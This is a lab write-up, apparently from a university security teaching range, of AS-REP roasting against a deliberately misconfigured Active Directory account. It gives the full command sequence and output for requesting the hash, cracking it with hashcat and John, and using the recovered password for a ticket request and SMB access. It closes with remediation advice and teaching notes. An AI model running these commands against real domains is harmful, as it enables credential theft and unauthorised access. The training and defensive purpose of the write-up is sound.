# AS-REP Roasting: helpdesk01 Account

## Summary

`helpdesk01` (Helpdesk Operator, `OU=Users,OU=UOW-CSF`, member of `IT-Helpdesk`) has Kerberos pre-authentication disabled (`DoesNotRequirePreAuth`), allowing its AS-REP to be requested and its password hash extracted by anyone who knows the username, without any credential or prior domain access at all. The password is complexity-compliant but predictable, cracked from the offline hash in under a second with the same targeted wordlist used in `e-18`. The recovered credential was independently validated by requesting a fresh TGT and by authenticating an SMB session.

## Environment

| Item | Value |
|---|---|
| Target | `uow-csf-dc.uow-csf.internal`, `192.168.144.200` |
| Domain | `uow-csf.internal` |
| Target account | `helpdesk01` (Helpdesk Operator) |
| Attacker | Kali VM on the same host-only lab network |
| Tools | `impacket-GetNPUsers`, `impacket-getTGT`, `hashcat` (PoCL CPU backend), `john`, `smbclient` |
| Wordlists | `/usr/share/wordlists/cav-csf-users.txt` (target username), `/usr/share/wordlists/cav-csf-wordlist.txt` (cracking), see `wordlists-README.md` |

## Lab Dependencies

- Prerequisite: `r-19` (Windows/AD enumeration), which confirmed `helpdesk01` as a valid domain principal via Kerberos pre-authentication error codes. No credential from `r-19` is required here, unlike `e-18`, this activity needs no prior authentication at all.
- Starting access: none (unauthenticated).
- Resulting access: a third, independent domain credential (`helpdesk01` / `Helpdesk2026!`), confirmed valid via a fresh Kerberos TGT and an authenticated SMB session.
- Feeds into: nothing built yet. `IT-Helpdesk` carries no delegated rights in the current build.
- Suggested teaching level: Level 5–6, a lower barrier to entry than `e-18`, since no domain credential is needed first.

## Misconfiguration

`helpdesk01` has the `DoesNotRequirePreAuth` account control flag set (`UF_DONT_REQUIRE_PREAUTH`), which removes the normal requirement that a client encrypt a timestamp with its own password before the KDC will issue a ticket. Without pre-authentication, the KDC returns an AS-REP encrypted with the account's password-derived key to anyone who supplies a valid username, no password, session, or prior access of any kind is needed to obtain the encrypted material. This flag is sometimes left set for legacy client compatibility; here it is a deliberate Phase 2 condition rather than an accident. As with `svc-web` in `e-18`, the account's password is complexity-compliant by AD's default policy but predictable, a policy-compliant-but-weak password paired with a legitimate AD feature, not a bug.

## Exploitation

### Requesting the AS-REP hash

```bash
impacket-GetNPUsers uow-csf.internal/ -usersfile /usr/share/wordlists/cav-csf-users.txt -dc-ip 192.168.144.200 -no-pass -format hashcat -outputfile asrep-helpdesk01.txt
```

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User analyst doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mpatel doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jreed doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User skhan doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$helpdesk01@UOW-CSF.INTERNAL:73fa77995ebb6bdac0fac1db566c9062$74ea29bcadb3d5942089a2545a8416eb7785ea45eada01d220f655450414face75adda53b4609c71683cf13a11fb197112d14b9822120294c4e963b86b573f3f057909dc7c7c4e1beb2b481ce130084ec34bafde7a21728b331fae342e00de4e83e05489334139011fae34ea9f43a7e20e3e42300634c888f9bf6103357899180b363ed01c8ef8e2890092bcc4c2d42b2dae242b520801677150c9d4d36b0a35374833bbbe6d5e135c0264574660442baca0a8e3dbb33ace12ef401f5eefa95ff5e2db06e5842cf2228ebe088e96f14130bbd4cd16d57c380909a447eb8b52f6b001b32e512f9d71bf402cb9387851c2c2a42fb6
[-] User svc-web doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup.operator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

Every other confirmed account from `r-19` (`administrator`, `analyst`, `mpatel`, `jreed`, `skhan`, `svc-web`, `backup.operator`) correctly still requires pre-authentication, and the 16 generic guesses in `cav-csf-users.txt` return `KDC_ERR_C_PRINCIPAL_UNKNOWN`, the same negative-control pattern established in `r-19`. Only `helpdesk01` yields a hash, confirming the misconfiguration is scoped to this one account rather than a domain-wide policy change.

### Cracking: hashcat

```bash
hashcat -m 18200 asrep-helpdesk01.txt /usr/share/wordlists/cav-csf-wordlist.txt
```

```text
* Device #01: cpu-sandybridge-Intel(R) Core(TM) i9-10920X CPU @ 3.50GHz, 734/1469 MB (734 MB allocatable), 4MCU
...
Watchdog: Temperature abort trigger set to 90c
* Device #1: Not enough allocatable device memory or free host memory for mapping.
Started: Mon Aug 31 06:06:16 2026
Stopped: Mon Aug 31 06:06:17 2026
```

The same resource-constraint failure already documented in `e-18`, a genuine limitation of this VM's CPU-based OpenCL backend, not corrected or hidden. John, run independently, is unaffected.

### Cracking: John the Ripper (independent cross-check)

```bash
john --format=krb5asrep --wordlist=/usr/share/wordlists/cav-csf-wordlist.txt asrep-helpdesk01.txt
john --show --format=krb5asrep asrep-helpdesk01.txt
```

```text
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Helpdesk2026!    ($krb5asrep$23$helpdesk01@UOW-CSF.INTERNAL)
1g 0:00:00:00 DONE (2026-08-31 06:06) 100.0g/s 15300p/s 15300c/s 15300C/s cavcsf..Web#1
Session completed.
```

```text
$krb5asrep$23$helpdesk01@UOW-CSF.INTERNAL:Helpdesk2026!
1 password hash cracked, 0 left
```

## Validating the Recovered Credential

```bash
impacket-getTGT uow-csf.internal/helpdesk01:'Helpdesk2026!' -dc-ip 192.168.144.200
```

```text
[*] Saving ticket in helpdesk01.ccache
```

A freshly issued TGT from the KDC is definitive proof the password is correct, independent of the offline crack.

## Resulting Access

```bash
smbclient -L //192.168.144.200/ -U 'UOWCSF\helpdesk01%Helpdesk2026!'
```

```text
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
```

```bash
smbclient //192.168.144.200/SYSVOL -U 'UOWCSF\helpdesk01%Helpdesk2026!' -c 'ls'
```

```text
  .                                   D        0  Thu Aug 27 06:21:58 2026
  ..                                  D        0  Thu Aug 27 06:21:58 2026
  uow-csf.internal                   Dr        0  Thu Aug 27 06:21:58 2026
                15570943 blocks of size 4096. 12627805 blocks available
```

Same pattern as `e-18`: valid credentials authenticate over SMB and read `SYSVOL`'s contents, ordinary authenticated-user access, not a privilege specific to `helpdesk01` or `IT-Helpdesk`.

## Outcome

AS-REP roasting recovered a third domain credential, `helpdesk01` / `Helpdesk2026!`, without needing any prior domain access, only a valid username already known from `r-19`. This is domain **credential exposure**, obtained through a fundamentally different mechanism than `e-18`'s Kerberoasting (no authentication precondition at all, versus requiring an existing authenticated principal), yielding the same ordinary authenticated-user access level. `helpdesk01` holds no elevated rights and no further chain exists from it in the current build.

## Remediation

- Do not disable Kerberos pre-authentication unless a specific, documented legacy compatibility requirement demands it.
- Where pre-authentication cannot be enabled, compensate with a long, random password not derivable from any wordlist.
- Restrict Kerberos encryption types to AES only, to substantially raise offline cracking cost even against a weak password.
- Monitor for AS-REQ traffic without pre-authentication data, a standard AS-REP roasting detection signal.

## Teaching Notes

- Direct contrast with `e-18`: Kerberoasting requires an authenticated domain principal before a service ticket can be requested; AS-REP roasting requires nothing but a valid username, a materially lower barrier to entry for an attacker with no foothold at all.
- Cross-tool verification (hashcat blocked by a known resource limit, John succeeding independently) follows this project's standing rule that a single tool's output is a claim, not a verdict.
- `helpdesk01`'s Phase 2 password (`Helpdesk2026!`) is deliberately distinct from both the Phase 1 shared baseline (`CavLab2026!`) and `svc-web`'s Phase 2 password (`Webservice2026!`), consistent with the project's standing rule against reusing credentials across Phase 2 attack targets.
- The negative-control results (every other confirmed account still requiring pre-auth, every generic username guess rejected as unknown) are shown alongside the positive hit, demonstrating the misconfiguration is scoped and deliberate rather than a blanket policy weakness.